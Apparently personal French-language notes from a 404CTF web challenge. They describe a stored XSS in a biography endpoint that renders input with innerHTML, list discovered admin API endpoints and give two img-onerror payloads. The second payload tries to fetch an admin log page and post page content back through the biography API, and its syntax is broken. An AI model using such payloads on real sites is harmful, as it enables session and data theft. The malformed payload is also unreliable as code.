



XSS trouver dans le /api/biography, Utilisations de innerHTML et non de textContent.

textContent va prendre tout ce qui est le text brute or innerHTML va prendre en compte les balises etc...

XSS trouver : 

```javascript
<img src="x" onerror="console.log('test')" ;="">
```



endpoint trouver : 



[9cfdcb63d8b1a668.s.404ctf.fr/api/admin/isAdmin](https://9cfdcb63d8b1a668.s.404ctf.fr/api/admin/isAdmin)

[9cfdcb63d8b1a668.s.404ctf.fr/api/accounts
[9cfdcb63d8b1a668.s.404ctf.fr/api/admin/

https://9cfdcb63d8b1a668.s.404ctf.fr/api/admin/log-visit




visit.js
Condition risquée. trop permissif 

![](../img/Pasted%20image%2020260518230114.png)


editBiography.js
Possibilité de request POST et de poster le contenu de fichier sensible.

![](../img/Pasted%20image%2020260518230330.png)



requête : 

![](../img/Pasted%20image%2020260518230549.png)



![](../img/Pasted%20image%2020260518230601.png)




```javascript
<img src="x" onerror="fetch('/api/admin/log-visit').then(() => {var content = document.body.innerHTML} , fetch('/api/biography' , {method: 'POST', headers:{'Content-Type' : 'application/json', body: JSON.stringify({ u_id: 1 }) ;>

```



